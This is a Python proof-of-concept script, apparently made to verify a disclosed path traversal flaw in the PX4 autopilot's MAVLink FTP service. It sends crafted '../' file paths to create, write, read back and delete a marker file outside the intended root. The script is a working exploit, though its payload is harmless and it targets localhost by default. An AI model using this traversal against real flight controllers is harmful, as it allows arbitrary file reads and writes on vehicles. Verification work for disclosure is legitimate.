#!/usr/bin/env python3
"""PX4 MAVLink FTP path traversal (verification PoC).

Goal (dynamic verification):
- Use MAVLink FILE_TRANSFER_PROTOCOL (MAVFTP) with a relative path containing traversal (../)
- Demonstrate file operations outside the intended root (POSIX/SITL)

Safety:
- Localhost only by default.
- Writes a clearly-marked file under /tmp and then deletes it.

Expected vulnerable behavior (per audit report 01):
- CREATE + WRITE succeed for a traversal path that resolves to /tmp/...
- OPEN_RO + READ returns the content written.

"""

from __future__ import annotations

import argparse
import os
import struct
import time
from dataclasses import dataclass
from typing import Optional, Tuple

from pymavlink.dialects.v20 import common as mav2

from disclosure._shared.mavlink_poc_common import UdpEndpoint, MavUdpClient, build_arg_parser


# MAVLink FTP opcodes (PX4 mavlink_ftp.h)
OP_OPEN_RO = 4
OP_READ = 5
OP_CREATE = 6
OP_WRITE = 7
OP_REMOVE_FILE = 8

RSP_ACK = 128
RSP_NAK = 129

HDR_LEN = 12
MAX_PAYLOAD = 251
MAX_DATA = MAX_PAYLOAD - HDR_LEN  # 239


def pack_ftp(seq: int, opcode: int, size: int, offset: int = 0, session: int = 0, data: bytes = b"") -> bytes:
    if len(data) > MAX_DATA:
        raise ValueError("data too long")
    if size < 0 or size > MAX_DATA:
        raise ValueError("invalid size")
    # <HBBBBBBI => seq u16, session u8, opcode u8, size u8, req_opcode u8, burst_complete u8, padding u8, offset u32
    header = struct.pack("<HBBBBBBI", seq & 0xFFFF, session & 0xFF, opcode & 0xFF, size & 0xFF, 0, 0, 0, offset & 0xFFFFFFFF)
    payload = header + data
    payload += b"\x00" * (MAX_PAYLOAD - len(payload))
    return payload


def unpack_ftp(payload251: bytes) -> Tuple[int, int, int, int, int, int, int, int, bytes]:
    if len(payload251) != MAX_PAYLOAD:
        raise ValueError("unexpected payload size")
    seq, session, opcode, size, req_opcode, burst_complete, padding, offset = struct.unpack("<HBBBBBBI", payload251[:HDR_LEN])
    data = payload251[HDR_LEN : HDR_LEN + size]
    return seq, session, opcode, size, req_opcode, burst_complete, padding, offset, data


def recv_ftp(client: MavUdpClient, timeout_s: float) -> Optional[Tuple[int, int, int, int, int, int, int, int, bytes]]:
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        m = client.recv(timeout_s=0.5)
        if m is None:
            continue
        if m.get_type() != "FILE_TRANSFER_PROTOCOL":
            continue
        payload = bytes(m.payload)
        return unpack_ftp(payload)
    return None


def require_ack(resp, expect_req_opcode: int) -> None:
    if resp is None:
        raise RuntimeError("no FTP response")
    seq, session, opcode, size, req_opcode, *_rest, data = resp
    if opcode == RSP_NAK:
        err = data[0] if len(data) > 0 else None
        errno_ = data[1] if len(data) > 1 else None
        raise RuntimeError(f"FTP NAK: err={err} errno={errno_} req_opcode={req_opcode}")
    if opcode != RSP_ACK:
        raise RuntimeError(f"unexpected response opcode={opcode}")
    if req_opcode != expect_req_opcode:
        raise RuntimeError(f"unexpected req_opcode={req_opcode} expect={expect_req_opcode}")


def main() -> int:
    ap = build_arg_parser("MAVFTP path traversal verification")
    ap.add_argument("--work-dir", default=None, help="SITL working dir used to compute relative traversal to /tmp")
    ap.add_argument("--tmp-filename", default="px4_mavftp_disclosure_poc.txt")
    args = ap.parse_args()

    client = MavUdpClient(
        bind=UdpEndpoint(args.bind_host, args.bind_port),
        target=UdpEndpoint(args.target_host, args.target_port),
        sysid=args.sysid,
        compid=args.compid,
    )

    # help partner bind
    for _ in range(5):
        client.send_heartbeat()
        client.send_ping()
        time.sleep(0.05)

    # Compute traversal path
    # Default to the SITL build rootfs directory (this matches the runtime log showing workdir is rootfs).
    work_dir = args.work_dir or os.path.join(os.path.expanduser("~"), "PX4/PX4-Autopilot/build/px4_sitl_default/rootfs")
    rel_to_tmp = os.path.relpath("/tmp", work_dir)
    outside_path = os.path.join(rel_to_tmp, args.tmp_filename)

    content = b"PX4_MAVFTP_DISCLOSURE_POC\n"

    seq = 1

    def send_ftp(payload251: bytes):
        msg = mav2.MAVLink_file_transfer_protocol_message(
            target_network=0,
            target_system=0,
            target_component=0,
            payload=payload251,
        )
        client.send(msg)

    print(f"[*] target={args.target_host}:{args.target_port} bind={args.bind_host}:{args.bind_port}")
    print(f"[*] work_dir={work_dir}")
    print(f"[*] traversal_path={outside_path}")

    # CREATE (allocates a session)
    print("[*] FTP OP_CREATE ...")
    payload = pack_ftp(seq, OP_CREATE, size=len(outside_path), data=outside_path.encode("utf-8"))
    send_ftp(payload)
    resp = recv_ftp(client, timeout_s=min(3.0, args.timeout))
    require_ack(resp, OP_CREATE)
    _seq, session_create, *_ = resp
    print(f"[+] CREATE ack (session={session_create})")

    # WRITE (use same session)
    seq += 1
    print("[*] FTP OP_WRITE ...")
    payload = pack_ftp(seq, OP_WRITE, size=len(content), session=session_create, data=content)
    send_ftp(payload)
    resp = recv_ftp(client, timeout_s=min(3.0, args.timeout))
    require_ack(resp, OP_WRITE)
    print("[+] WRITE ack")

    # Terminate the create/write session to avoid exhausting FTP sessions
    seq += 1
    print("[*] FTP OP_TERMINATE (close write session) ...")
    payload = pack_ftp(seq, 1, size=0, session=session_create, data=b"")
    send_ftp(payload)
    resp = recv_ftp(client, timeout_s=min(3.0, args.timeout))
    require_ack(resp, 1)
    print("[+] TERMINATE ack")

    # OPEN_RO (new session)
    seq += 1
    print("[*] FTP OP_OPEN_RO ...")
    payload = pack_ftp(seq, OP_OPEN_RO, size=len(outside_path), data=outside_path.encode("utf-8"))
    send_ftp(payload)
    resp = recv_ftp(client, timeout_s=min(3.0, args.timeout))
    require_ack(resp, OP_OPEN_RO)
    _seq, session_ro, *_ = resp
    print(f"[+] OPEN_RO ack (session={session_ro})")

    # READ (use RO session)
    seq += 1
    print("[*] FTP OP_READ ...")
    read_len = 64
    payload = pack_ftp(seq, OP_READ, size=read_len, session=session_ro, data=b"")
    send_ftp(payload)
    resp = recv_ftp(client, timeout_s=min(3.0, args.timeout))
    require_ack(resp, OP_READ)
    _seq, _session, _opcode, size, *_rest, data = resp
    got = bytes(data[:size])
    print("[+] READ ack")
    print("read_bytes=", got)

    # Terminate RO session
    seq += 1
    print("[*] FTP OP_TERMINATE (close RO session) ...")
    payload = pack_ftp(seq, 1, size=0, session=session_ro, data=b"")
    send_ftp(payload)
    resp = recv_ftp(client, timeout_s=min(3.0, args.timeout))
    require_ack(resp, 1)
    print("[+] TERMINATE ack")

    # REMOVE
    seq += 1
    print("[*] FTP OP_REMOVE_FILE ...")
    payload = pack_ftp(seq, OP_REMOVE_FILE, size=len(outside_path), data=outside_path.encode("utf-8"))
    send_ftp(payload)
    resp = recv_ftp(client, timeout_s=min(3.0, args.timeout))
    require_ack(resp, OP_REMOVE_FILE)
    print("[+] REMOVE_FILE ack")

    if content.strip() in got:
        print("PASS: traversal CREATE/WRITE/READ succeeded and content matched")
        return 0
    else:
        print("FAIL: did not read back expected marker content")
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
